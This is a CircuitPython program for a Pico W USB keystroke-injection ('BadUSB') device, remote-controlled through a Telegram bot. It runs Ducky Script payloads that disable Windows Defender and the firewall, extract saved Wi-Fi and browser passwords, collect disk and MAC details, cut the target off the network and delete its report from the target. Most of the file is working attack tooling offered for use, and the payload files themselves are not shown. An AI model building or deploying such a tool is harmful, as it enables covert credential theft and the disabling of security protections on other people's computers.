import usb_hid
import supervisor
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
import os
import ipaddress
import wifi
import socketpool
import time
import microcontroller
import board
import digitalio
import simpleio
import adafruit_requests
import ssl
import json
import urequests as requests
from board import *
#from adafruit_telepot import TelegraphBot


duckyCommands = ["WINDOWS", "GUI", "APP", "MENU", "SHIFT", "ALT", "CONTROL", "CTRL", "DOWNARROW", "DOWN",
"LEFTARROW", "LEFT", "RIGHTARROW", "RIGHT", "UPARROW", "UP", "BREAK", "PAUSE", "CAPSLOCK", "DELETE", "END",
"ESC", "ESCAPE", "HOME", "INSERT", "NUMLOCK", "PAGEUP", "PAGEDOWN", "PRINTSCREEN", "SCROLLLOCK", "SPACE",
"TAB", "ENTER", " a", " b", " c", " d", " e", " f", " g", " h", " i", " j", " k", " l", " m", " n", " o", " p", " q", " r", " s", " t",
" u", " v", " w", " x", " y", " z", " A", " B", " C", " D", " E", " F", " G", " H", " I", " J", " K", " L", " M", " N", " O", " P",
" Q", " R", " S", " T", " U", " V", " W", " X", " Y", " Z", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12"]

keycodeCommands = [Keycode.WINDOWS, Keycode.GUI, Keycode.APPLICATION, Keycode.APPLICATION, Keycode.SHIFT, Keycode.ALT, Keycode.CONTROL,
Keycode.CONTROL, Keycode.DOWN_ARROW, Keycode.DOWN_ARROW ,Keycode.LEFT_ARROW, Keycode.LEFT_ARROW, Keycode.RIGHT_ARROW, Keycode.RIGHT_ARROW,
Keycode.UP_ARROW, Keycode.UP_ARROW, Keycode.PAUSE, Keycode.PAUSE, Keycode.CAPS_LOCK, Keycode.DELETE, Keycode.END, Keycode.ESCAPE,
Keycode.ESCAPE, Keycode.HOME, Keycode.INSERT, Keycode.KEYPAD_NUMLOCK, Keycode.PAGE_UP, Keycode.PAGE_DOWN, Keycode.PRINT_SCREEN,
Keycode.SCROLL_LOCK, Keycode.SPACE, Keycode.TAB, Keycode.ENTER, Keycode.A, Keycode.B, Keycode.C, Keycode.D, Keycode.E, Keycode.F, Keycode.G,
Keycode.H, Keycode.I, Keycode.J, Keycode.K, Keycode.L, Keycode.M, Keycode.N, Keycode.O, Keycode.P, Keycode.Q, Keycode.R, Keycode.S, Keycode.T,
Keycode.U, Keycode.V, Keycode.W, Keycode.X, Keycode.Y, Keycode.Z, Keycode.A, Keycode.B, Keycode.C, Keycode.D, Keycode.E, Keycode.F,
Keycode.G, Keycode.H, Keycode.I, Keycode.J, Keycode.K, Keycode.L, Keycode.M, Keycode.N, Keycode.O, Keycode.P,
Keycode.Q, Keycode.R, Keycode.S, Keycode.T, Keycode.U, Keycode.V, Keycode.W, Keycode.X, Keycode.Y, Keycode.Z,
Keycode.F1, Keycode.F2, Keycode.F3, Keycode.F4, Keycode.F5, Keycode.F6, Keycode.F7, Keycode.F8, Keycode.F9,
Keycode.F10, Keycode.F11, Keycode.F12]

supervisor.runtime.autoreload = False

def convertLine(line):
    newline = []
    print(line)
    for j in range(len(keycodeCommands)):
		    if line.find(duckyCommands[j]) != -1:
		    	newline.append(keycodeCommands[j])
    print(newline)
    return newline



def runScriptLine(line):
    for k in line:
        kbd.press(k)
    kbd.release_all()

def sendString(line):
    layout.write(line)

def parseLine(line):
    if(line[0:3] == "REM"):
        # ignore ducky script comments
        pass
    elif(line[0:5] == "DELAY"):
        time.sleep(float(line[6:])/1000)
    elif(line[0:6] == "STRING"):
        sendString(line[7:])
    elif(line[0:13] == "DEFAULT_DELAY"):
        defaultDelay = int(line[14:]) * 10
    elif(line[0:12] == "DEFAULTDELAY"):
        defaultDelay = int(line[13:]) * 10
    else:
        newScriptLine = convertLine(line)
        runScriptLine(newScriptLine)

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

# sleep at the start to allow the device to be recognized by the host computer
time.sleep(.2)


# check GP0 for setup mode
# see setup mode for instructions
progStatus = False
progStatusPin = digitalio.DigitalInOut(GP0)
progStatusPin.switch_to_input(pull=digitalio.Pull.UP)
progStatus = not progStatusPin.value
defaultDelay = 0
    
#tele
print(os.getenv("test_env_file"))
ssid = os.getenv("WIFI_SSID")
password = os.getenv("WIFI_PASSWORD")
telegrambot = os.getenv("botToken")

API_URL = "https://api.telegram.org/bot" + telegrambot
#bot = TelegraphBot(telegrambot)

NOTE_G4 = 392
NOTE_C5 = 523
buzzer = board.GP18

led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT


pb = digitalio.DigitalInOut(board.GP20)
pb.direction = digitalio.Direction.INPUT



def init_bot():
    get_url = API_URL
    get_url += "/getMe"
    r = requests.get(get_url)
    return r.json()['ok']

first_read = True
update_id = 0

def read_message():
    global first_read
    global update_id
    
    get_url = API_URL
    get_url += "/getUpdates?limit=1&allowed_updates=[\"message\",\"callback_query\"]"
    if first_read == False:
        get_url += "&offset={}".format(update_id)

    r = requests.get(get_url)
    #print(r.json())
    
    try:
        update_id = r.json()['result'][0]['update_id']
        message = r.json()['result'][0]['message']['text']
        chat_id = r.json()['result'][0]['message']['chat']['id']

        #print("Update ID: {}".format(update_id))
        print("Chat ID: {}\tMessage: {}".format(chat_id, message))

        first_read = False
        update_id += 1
        simpleio.tone(buzzer, NOTE_G4, duration=0.1)
        simpleio.tone(buzzer, NOTE_C5, duration=0.1)
        
        return chat_id, message

    except (IndexError) as e:
        #print("No new message")
        return False, False

def send_message(chat_id, message):
    get_url = API_URL
    get_url += "/sendMessage?chat_id={}&text={}".format(chat_id, message)
    r = requests.get(get_url)
    #print(r.json())

def send_file(chat_id, file_path):
    # Open the file and read its contents
    with open(file_path, 'rb') as file:
        requests.post(API_URL + '/sendDocument', file)
        #file_data = f.read()

    # Create the request payload
    #payload = {'chat_id': chat_id}
    #files = {'document': ('file.pdf', file_data, 'application/pdf')}

    # Send the request
    #response = requests.post(API_URL + '/sendDocument', data=payload, files=files)

    # Print the response
    #print(response.json())

def readIntTemp():
    data = microcontroller.cpu.temperature
    data = "Temperature: {:.2f} °C".format(data)
    return data

# Set access point credentials
#ap_ssid = "myAP"
#ap_password = "password123"

# Configure access point
#wifi.radio.start_ap(ssid=ap_ssid, password=ap_password)

# Print access point settings
#print("Access point created with SSID: {}, password: {}".format(ap_ssid, ap_password))
#print("My IP address is", str(wifi.radio.ipv4_address_ap))

# Create a socket pool
#pool = socketpool.SocketPool(wifi.radio)


#  Connect to Wi-Fi AP
print(f"Initializing...")
wifi.radio.connect(ssid, password)
print("connected!\n")
pool = socketpool.SocketPool(wifi.radio)
print("IP Address: {}".format(wifi.radio.ipv4_address))
print("Connecting to WiFi '{}' ... ".format(ssid), end="")

requests = adafruit_requests.Session(pool, ssl.create_default_context())

if init_bot() == False:
    print("\nTelegram bot failed.")
    led.value = False
            
else:
    print("\nTelegram bot ready!\n")
    simpleio.tone(buzzer, NOTE_C5, duration=0.1)
    led.value = True
    
            

while True:
    try:
        while not wifi.radio.ipv4_address or "0.0.0.0" in repr(wifi.radio.ipv4_address):
            print(f"Reconnecting to WiFi...")
            wifi.radio.connect(ssid, password)
            
        chat_id, message_in = read_message()
       
        if message_in == "/start":
            send_message(chat_id,"Welcome to Jhojy's Hacking USB Device!")
            send_message(chat_id,"/auto")
            send_message(chat_id,"/manual")
            send_message(chat_id,"/change_connection")
        elif message_in == "/change_connection":
                send_message(chat_id, "Coming soon")
        elif message_in == "/auto": 
            send_message(chat_id,"Wait the hacking process")
            #run payload 1
            duckyScriptPath = "Payloads/payload.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running payload.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)

            print("Done")
            #run payload 2
            duckyScriptPath = "Payloads/def_off.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running def_off.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
            #run payload 3
            duckyScriptPath = "Payloads/fire_off.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running fire_off.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
            #run payload 4
            duckyScriptPath = "Payloads/wifi.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running wifi.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
            #run payload 5
            duckyScriptPath = "Payloads/DISK.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running DISK.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
            #run payload 6
            duckyScriptPath = "Payloads/MAC.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running MAC.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
            send_message(chat_id,"/report")
        elif message_in == "/manual":
            send_message(chat_id,"1) Built-in LED ON:  /LED_ON")
            send_message(chat_id,"2) Built-in LED OFF: /LED_OFF")
            send_message(chat_id,"3) Read Internal Temperature: /Temp")
            send_message(chat_id,"4) NGEGAS: /GAS")
            send_message(chat_id,"5) Turn Off Defender: /D_DOWN")
            send_message(chat_id,"6) Turn On Defender: /D_UP")
            send_message(chat_id,"7) Turn Off Firewall: /F_DOWN")
            send_message(chat_id,"8) Turn On Firewall: /F_UP")
            send_message(chat_id,"9) Get pass wifi: /get_wifi")
            send_message(chat_id,"10) Delete wifi creds & disconnect target from internet: /delete_wifi_creds")
            send_message(chat_id,"11) Check Push Button Status: /PB")
            send_message(chat_id,"12) Get mac info: /mac")
            send_message(chat_id,"13) Get disk info: /disk")
            send_message(chat_id,"14) Get the browser saved password: /browser")
            send_message(chat_id,"15) See the report: /report")
            send_message(chat_id,"16) Delete file report from target: /delete_report")
        elif message_in == "/LED_ON":
            led.value = True
            send_message(chat_id, "LED turn on.")
        elif message_in == "/LED_OFF":
            led.value = False
            send_message(chat_id, "LED turn off.")
        elif message_in == "/Temp":
            temp = readIntTemp()
            send_message(chat_id, temp)
        elif message_in == "/GAS":
            duckyScriptPath = "Payloads/press.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running press.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                        
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
        elif message_in == "/D_DOWN":
            duckyScriptPath = "Payloads/def_off.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running def_off.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
        elif message_in == "/D_UP":
            duckyScriptPath = "Payloads/def_on.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running def_on.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
        elif message_in == "/F_DOWN":
            duckyScriptPath = "Payloads/fire_off.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running fire_off.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
        elif message_in == "/F_UP":
            duckyScriptPath = "Payloads/fire_on.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running fire_on.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
        elif message_in == "/get_wifi":
            duckyScriptPath = "Payloads/wifi.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running wifi.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
        elif message_in == "/delete_wifi_creds":
            duckyScriptPath = "Payloads/delete.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running delete.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")    
        elif message_in == "/PB":
            if (pb.value == False):
                send_message(chat_id, "Push Button Pressed")
            else:
                send_message(chat_id, "Push Button X Pressed")
            send_message(chat_id,"See the report: /report")
        elif message_in == "/disk":
            duckyScriptPath = "Payloads/DISK.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running DISK.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
        elif message_in == "/mac":
            duckyScriptPath = "Payloads/MAC.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running MAC.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
        elif message_in == "/browser":
            duckyScriptPath = "Payloads/BROWSER.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running BROWSER.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
        elif message_in == "/report":
            duckyScriptPath = "Payloads/report.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running report.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
                #file_path = "SavedWiFiPass.pdf"
                #send_message(chat_id, "Coming soon")
                #send_file(chat_id, file_path)
        elif message_in == "/delete_report":
            duckyScriptPath = "Payloads/delete_report.dd"
            f = open(duckyScriptPath,"r",encoding='utf-8')
            print("Running delete_report.dd")
            previousLine = ""
            duckyScript = f.readlines()
            for line in duckyScript:
                line = line.rstrip()
                if(line[0:6] == "REPEAT"):
                    for i in range(int(line[7:])):
                        #repeat the last command
                        parseLine(previousLine)
                        time.sleep(float(defaultDelay)/1000)
                else:
                    parseLine(line)
                    previousLine = line
                time.sleep(float(defaultDelay)/1000)
            print("Done")
        else:
            send_message(chat_id, "Command is not available.")
        
        
    except OSError as e:
        print("Failed!\n", e)
        microcontroller.reset()